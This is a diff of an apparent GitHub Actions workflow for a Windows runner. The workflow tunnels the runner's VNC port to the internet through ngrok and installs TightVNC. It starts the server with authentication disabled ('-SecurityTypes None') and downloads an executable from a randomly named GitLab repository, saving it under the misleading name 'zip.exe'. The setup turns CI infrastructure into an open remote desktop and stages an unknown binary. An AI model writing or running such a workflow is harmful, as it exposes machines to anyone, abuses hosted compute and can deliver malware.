@@ -20,20 +20,17 @@ jobs:
 
       - name: Start ngrok tunnel for VNC
         run: |
-          Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 5901" -NoNewWindow -PassThru
+          Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 5900" -NoNewWindow -PassThru
           Start-Sleep -s 10  # Ngrok'un başlaması için biraz bekleme süresi
 
-      - name: Setuo VNC server
+      - name: Setup VNC server
         run: |
-          # VNC server'ı burada başlatın (örneğin TightVNC kullanılabilir)
-          # Örnek komut: vncserver :1 -geometry 1920x1080 -depth 24
-          # Gerekli kurulumları yapmak için önce choco install komutuyla gerekli paketleri yükleyin
           choco install -y tightvnc
 
       - name: Start VNC server
         run: |
            taskkill /f /im tvnserver.exe
-           cmd /c '"C:\Program Files\TightVNC\tvnserver.exe" :1 -geometry 1920x1080 -depth 24 -SecurityTypes None'
+           cmd /c '"C:\Program Files\TightVNC\tvnserver.exe" :0 -geometry 1920x1080 -depth 24 -SecurityTypes None'
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            cmd /c sleep 240
            cmd /c curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
